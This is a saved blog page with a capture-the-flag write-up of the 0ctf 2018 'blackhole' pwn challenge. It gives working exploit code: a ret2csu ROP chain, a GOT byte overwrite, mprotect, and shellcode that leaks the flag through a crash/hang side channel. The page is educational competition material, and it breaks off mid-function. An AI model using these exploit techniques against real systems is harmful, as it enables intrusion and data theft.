@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://kileak.github.io/ctf/2018/0ctf-qual-blackhole/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title> 0ctf 2018 quals - blackhole | kileak</title>
+
+
+
+
+
+<meta name="description" content="0ctf 2018 quals - blackhole">
+
+
+<meta name="keywords" content="0ctf">
+
+
+
+<link rel="stylesheet" href="./0ctf 2018 quals - blackhole _ kileak_files/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/0ctf-qual-blackhole/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml">
+
+
+
+<script type="text/javascript" async="" src="./0ctf 2018 quals - blackhole _ kileak_files/ga.js.下载"></script><script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-98579931-1']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+
+<script>base_url = "";</script>
+
+        
+  <script type="text/javascript" async="" src="https://kileak.disqus.com/embed.js"></script></head>
+  <body class="single">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="https://kileak.github.io/ctf/2018/0ctf-qual-blackhole/#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="https://kileak.github.io/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="https://kileak.github.io/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="https://kileak.github.io/" class="author-thumb dot">
+      <img src="./0ctf 2018 quals - blackhole _ kileak_files/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">0ctf 2018 quals - blackhole</h1>
+      <p class="post-meta">Apr 2, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>0ctf 2018 quals - blackhole
+<!--break--></p>
+
+  <p>Can get the flag from a black hole?</p>
+
+  <p>By the way, here is a so called return-to-csu method which you may want to know :P 
+(though personally thought this should be well-known in 2018)</p>
+
+  <p>202.120.7.203:666</p>
+
+  <p>In memory of Stephen William Hawking (1942–2018).
+Attachment: <a href="https://kileak.github.io/assets/blackhole/blackhole">blackhole</a> <a href="https://kileak.github.io/assets/blackhole/libc-2.24.so">libc</a> <a href="https://kileak.github.io/assets/blackhole/pow.py">pow.py</a> <a href="https://kileak.github.io/assets/blackhole/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></div>
+
+<p>Though in contrary to babystack, we’re provided the used libc this time, but that doesn’t makes it easier to pwn it…</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">init_seccomp</span><span class="p">();</span>
+  <span class="n">vuln</span><span class="p">();</span>  
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> 
+
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+
+<p>So, we have an obvious buffer overflow here, but there are some seccomp rules in place, which only allow very few syscalls</p>
+
+<ul>
+  <li><code>read</code></li>
+  <li><code>open</code></li>
+  <li><code>close</code></li>
+  <li><code>mprotect</code></li>
+  <li><code>exit</code></li>
+  <li><code>exit_group</code></li>
+</ul>
+
+<p>limiting us pretty much in what we can do to exfiltrate the flag from the server. It seems, we won’t get the binary to print out anything to us, so no leaks and if we can read the flag, no way to send it back to us.</p>
+
+<p>Well, let’s start with gaining <code>rip</code> access and executing functions. In order to use <code>read</code> for anything useful, we need to control <code>rdi</code>, <code>rsi</code> and <code>rdx</code>. While there are simple pop gadgets for <code>rsi</code> and <code>rdi</code>, there isn’t one for <code>rdx</code>.</p>
+
+<p>But we can get around this, by using the following two gadgets in combination</p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">gdb-peda$</span> <span class="no">x</span><span class="err">/</span><span class="mi">7</span><span class="no">i</span> <span class="mi">0x000000000400A4A</span>
+   <span class="err">0</span><span class="nl">x400a4a:</span>  <span class="nf">pop</span>    <span class="no">rbx</span>
+   <span class="err">0</span><span class="nl">x400a4b:</span>  <span class="nf">pop</span>    <span class="no">rbp</span>
+   <span class="err">0</span><span class="nl">x400a4c:</span>  <span class="nf">pop</span>    <span class="no">r12</span>
+   <span class="err">0</span><span class="nl">x400a4e:</span>  <span class="nf">pop</span>    <span class="no">r13</span>
+   <span class="err">0</span><span class="nl">x400a50:</span>  <span class="nf">pop</span>    <span class="no">r14</span>
+   <span class="err">0</span><span class="nl">x400a52:</span>  <span class="nf">pop</span>    <span class="no">r15</span>
+   <span class="err">0</span><span class="nl">x400a54:</span>  <span class="nf">ret</span></code></pre></div>
+
+<p>With this, we’ll control <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code>.</p>
+
+<p>Combined with this one:</p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">gdb-peda$</span> <span class="no">x</span><span class="err">/</span><span class="mi">15</span><span class="no">i</span> <span class="mi">0x0000000000400A30</span>
+   <span class="err">0</span><span class="nl">x400a30:</span>  <span class="nf">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r13</span>
+   <span class="err">0</span><span class="nl">x400a33:</span>  <span class="nf">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
+   <span class="err">0</span><span class="nl">x400a36:</span>  <span class="nf">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r15d</span>
+   <span class="err">0</span><span class="nl">x400a39:</span>  <span class="nf">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="err">]</span>
+   <span class="err">0</span><span class="nl">x400a3d:</span>  <span class="nf">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
+   <span class="err">0</span><span class="nl">x400a41:</span>  <span class="nf">cmp</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">rbp</span>
+   <span class="err">0</span><span class="nl">x400a44:</span>  <span class="nf">jne</span>    <span class="mi">0x400a30</span>
+   <span class="err">0</span><span class="nl">x400a46:</span>  <span class="nf">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
+   <span class="err">0</span><span class="nl">x400a4a:</span>  <span class="nf">pop</span>    <span class="no">rbx</span>
+   <span class="err">0</span><span class="nl">x400a4b:</span>  <span class="nf">pop</span>    <span class="no">rbp</span>
+   <span class="err">0</span><span class="nl">x400a4c:</span>  <span class="nf">pop</span>    <span class="no">r12</span>
+   <span class="err">0</span><span class="nl">x400a4e:</span>  <span class="nf">pop</span>    <span class="no">r13</span>
+   <span class="err">0</span><span class="nl">x400a50:</span>  <span class="nf">pop</span>    <span class="no">r14</span>
+   <span class="err">0</span><span class="nl">x400a52:</span>  <span class="nf">pop</span>    <span class="no">r15</span>
+   <span class="err">0</span><span class="nl">x400a54:</span>  <span class="nf">ret</span></code></pre></div>
+
+<p>we thus control <code>rdx</code>, <code>rsi</code> and <code>edi</code>. The following call, will call any function, whose address is stored at <code>r12 + rbx*8</code>, and since we also control <code>r12</code> and <code>rbx</code>, we can define, which function should be called.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># pop rbx / rbp / r12 / r13 / r14 / r15</span>
+<span class="n">PGAD</span> <span class="o">=</span> <span class="mh">0x000000000400A4A</span>
+
+<span class="c"># mov rdx, r13 / mov rsi, r14 / mov edi, r15 / call r12 + rbx*8</span>
+<span class="n">CALL</span> <span class="o">=</span> <span class="mh">0x0000000000400A30</span>
+
+<span class="k">def</span> <span class="nf">call_func</span><span class="p">(</span><span class="n">funcptr</span><span class="p">,</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx_after</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rbp_after</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">r12_after</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">r13_after</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">r14_after</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">r15_after</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PGAD</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>             <span class="c"># rbx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>             <span class="c"># rbp (1 to get more calls)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">funcptr</span><span class="p">)</span>         <span class="c"># r12 (func to call)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span>             <span class="c"># r13 =&gt; rdx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span>             <span class="c"># r14 =&gt; rsi</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span>             <span class="c"># r15 =&gt; rdi</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CALL</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx_after</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp_after</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r12_after</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r13_after</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r14_after</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r15_after</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span></code></pre></div>
+
+<p>We’ll be using this to <code>read</code> another ropchain, with a bit more space and also to a known address:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage1: Prepare bigger ropchain (on bss)"</span><span class="p">)</span>
+    
+<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">32</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601150</span><span class="p">)</span>
+
+<span class="o">...</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x601150</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x601150</span> <span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVERET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></div>
+
+<p>This reads another ropchain to <code>0x601150</code>, puts <code>0x601150 - 8</code> into <code>rbp</code> and the following <code>leave; ret</code> will pivot the stack to this new ropchain.</p>
+
+<p>Still, we only have calls to <code>read</code> and <code>alarm</code> available, but since we have the provided libc, we can abuse <code>read</code> to change this.</p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nl">alarm:</span>
+<span class="err">000</span><span class="nf">b8180</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x25</span>
+<span class="err">000</span><span class="nf">b8185</span>   <span class="no">syscall</span>                      <span class="c"># we want to call this</span>
+<span class="err">000</span><span class="nf">b8187</span>   <span class="no">cmp</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0xfffffffffffff001</span>
+<span class="err">000</span><span class="nf">b818d</span>   <span class="no">jae</span> <span class="mi">0xb8190</span>
+<span class="err">000</span><span class="nf">b818f</span>   <span class="no">retn</span></code></pre></div>
+
+<p>Since the last 3 nibbles of an address won’t be randomized by ASLR, we can overwrite the LSB of <code>alarm</code> got with <code>0x85</code> to change it into a neat syscall gadget.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage2: Send second ropchain (known address)"</span><span class="p">)</span>
+
+<span class="c"># overwrite LSB of alarm to get a syscall gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"alarm"</span><span class="p">],</span> <span class="mi">1</span><span class="p">)</span>      
+
+<span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>
+
+<span class="c"># alarm =&gt; syscall gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x85</span><span class="p">)</span></code></pre></div>
+
+<p>So, now we can trigger a <code>syscall</code> by calling <code>alarm@plt</code>. We now just need a proper way to set <code>rax</code> to the desired syscall (we’ll be using <code>mprotect</code> (10)).</p>
+
+<p>Again, we can use <code>read</code> for this, because it will store the count of read bytes in <code>rax</code>, so we’ll just be doing a <code>read(0, 0x601500, 10)</code>, resulting in <code>rax</code> to be set to <code>0xa</code> (<code>10</code>):</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x601500</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>            <span class="c"># set rax to mprotect</span></code></pre></div>
+
+<p>Now we can call <code>alarm@plt</code> to trigger mprotect, which we use to set protection of <code>bss</code> to <code>rwx</code>:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"alarm"</span><span class="p">],</span> <span class="mh">0x00601000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>   <span class="c"># call mprotect(0x601000, 0x1000, 0x7)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6012e0</span><span class="p">)</span>                                        <span class="c"># jump to shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"flag</span><span class="se">\x00</span><span class="s">"</span>                                           <span class="c"># maybe we'll be needing this string ;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">656</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">SC</span>                                                   <span class="c"># shellcode</span></code></pre></div>
+
+<p>Having an <code>rwx</code> bss, enables us to put some shellcode there and jump to it (with <code>p64(0x6012e0)</code>).</p>
+
+<p>But still, <code>seccomp</code> will hurt us, if we try to print out the flag. So what else can we do.</p>
+
+<p>Remember blind sql injection? Well, we can do something similar here:</p>
+
+<ul>
+  <li>Open the flag file</li>
+  <li>Read the string to a known address</li>
+  <li>Get a character at a specific offset</li>
+  <li>Compare it to a value</li>
+  <li>If the character is bigger, jump to a <code>good</code> branch (go into infinite loop for example), else to a <code>bad</code> branch (exit the program)</li>
+  <li>Check if the service is still available (condition met) or if it exited directly (condition not met)</li>
+</ul>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+
+<span class="c"># Read flag and compare char at offset with comp value</span>
+<span class="c"># exit if condition false / loop if condition true    </span>
+<span class="n">SC</span> <span class="o">=</span> <span class="s">"""</span>
+<span class="s">    mov rax, 2</span>
+<span class="s">    mov rdi, 0x6012c0</span>
+<span class="s">    mov rsi, 0</span>
+<span class="s">    mov rdx, 0</span>
+<span class="s">    syscall</span>
+
+<span class="s">    xchg rax, rdi</span>
+<span class="s">    xor rax, rax</span>
+<span class="s">    mov rsi, 0x601600</span>
+<span class="s">    mov rdx, 60</span>
+<span class="s">    syscall</span>
+
+<span class="s">    mov rcx, 0x601600</span>
+<span class="s">    add rcx, </span><span class="si">%d</span><span class="s"></span>
+<span class="s">    mov al, byte ptr [rcx]</span>
+<span class="s">    cmp al, </span><span class="si">%d</span><span class="s"></span>
+<span class="s">    jge good</span>
+
+<span class="s">    bad:</span>
+<span class="s">    mov rax, 60</span>
+<span class="s">    syscall</span>
+
+<span class="s">    good:</span>
+<span class="s">    mov rax, 0</span>
+<span class="s">    mov rdi, 0</span>
+<span class="s">    mov rsi, 0x601500</span>
+<span class="s">    mov rdx, 0x100</span>
+<span class="s">    syscall</span>
+<span class="s">    jmp good</span>
+<span class="s">"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">compval</span><span class="p">)</span></code></pre></div>
+
+<p>We put the filename <code>flag</code> already into <code>bss</code> at <code>0x6012c0</code>, so this shellcode will open it, read the content to <code>0x601600</code>, get the byte at <code>offset</code> from <code>0x601600</code> and compare it with <code>compval</code>. If it’s greater or equal it will jump to <code>good</code>, which basically just puts the binary into an infinite loop. Otherwise it will exit directly.</p>
+
+<p>Armed with this, we can write a <code>testchar</code> method, which will compare a value at a given offset with a specific compare value (It will need to open a connection for every test, though).</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">testchar</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">compval</span><span class="p">):</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Solve pow"</span><span class="p">)</span>
+
+    <span class="n">sol</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">while</span> <span class="n">sol</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">get_connection</span><span class="p">()</span>
+        
+        <span class="n">sol</span> <span class="o">=</span> <span class="n">calcpow</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+
+        <span class="k">if</span> <span class="n">sol</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>
+    
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage1: Prepare bigger ropchain (on bss)"</span><span class="p">)</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">32</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601150</span><span class="p">)</span>
+
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+    
+    <span class="c"># Read flag and compare char at offset with comp value</span>
+    <span class="c"># exit if condition false / loop if condition true    </span>
+    <span class="n">SC</span> <span class="o">=</span> <span class="s">"""</span>
+<span class="s">        mov rax, 2</span>
+<span class="s">        mov rdi, 0x6012c0</span>
+<span class="s">        mov rsi, 0</span>
+<span class="s">        mov rdx, 0</span>
+<span class="s">        syscall</span>
+
+<span class="s">        xchg rax, rdi</span>
+<span class="s">        xor rax, rax</span>
+<span class="s">        mov rsi, 0x601600</span>
+<span class="s">        mov rdx, 60</span>
+<span class="s">        syscall</span>
+
+<span class="s">        mov rcx, 0x601600</span>
+<span class="s">        add rcx, </span><span class="si">%d</span><span class="s"></span>
+<span class="s">        mov al, byte ptr [rcx]</span>
+<span class="s">        cmp al, </span><span class="si">%d</span><span class="s"></span>
+<span class="s">        jge good</span>
+
+<span class="s">        bad:</span>
+<span class="s">        mov rax, 60</span>
+<span class="s">        syscall</span>
+
+<span class="s">        good:</span>
+<span class="s">        mov rax, 0</span>
+<span class="s">        mov rdi, 0</span>
+<span class="s">        mov rsi, 0x601500</span>
+<span class="s">        mov rdx, 0x100</span>
+<span class="s">        syscall</span>
+<span class="s">        jmp good</span>
+<span class="s">    """</span> <span class="o">%</span> <span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">compval</span><span class="p">)</span>
+
+    <span class="n">SC</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+
+    <span class="n">off</span> <span class="o">=</span> <span class="mi">656</span><span class="o">-</span><span class="mi">256</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x601150</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x601150</span> <span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVERET</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage2: Send second ropchain (known address)"</span><span class="p">)</span>
+
+    <span class="c"># overwrite LSB of alarm to get a syscall gadget</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"alarm"</span><span class="p">],</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x601500</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>            <span class="c"># set rax to mprotect  </span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">call_func</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"alarm"</span><span class="p">],</span> <span class="mh">0x00601000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>   <span class="c"># syscall</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6012e0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"flag</span><span class="se">\x00</span><span class="s">"</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">656</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">SC</span>
+
+    <span class="c"># alarm =&gt; syscall gadget</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x85</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x800</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>  <span class="c"># check if service is still alive</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">False</span></code></pre></div>
+
+<p>This method will return <code>True</code> or <code>False</code>, depending if our compare value is greater/equal to the current character in the file.</p>
+
+<p>With this we can do a binary search for every character:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">brute_flag</span><span class="p">():</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="c"># binary search =&gt; read flag</span>
+    <span class="k">while</span> <span class="p">(</span><span class="bp">True</span><span class="p">):</span>
+        <span class="n">range_low</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">range_high</span> <span class="o">=</span> <span class="mi">128</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+            <span class="n">testch</span> <span class="o">=</span> <span class="p">(</span><span class="n">range_high</span> <span class="o">+</span> <span class="n">range_low</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+
+            <span class="k">print</span> <span class="s">"Test: </span><span class="si">%s</span><span class="s">"</span> <span class="o">%</span> <span class="nb">chr</span><span class="p">(</span><span class="n">testch</span><span class="p">)</span>
+
+            <span class="n">res</span> <span class="o">=</span> <span class="n">testchar</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">),</span> <span class="n">testch</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
+                <span class="n">range_low</span> <span class="o">=</span> <span class="n">testch</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">range_high</span> <span class="o">=</span> <span class="n">testch</span>
+
+        <span class="k">if</span> <span class="n">testch</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">break</span>
+
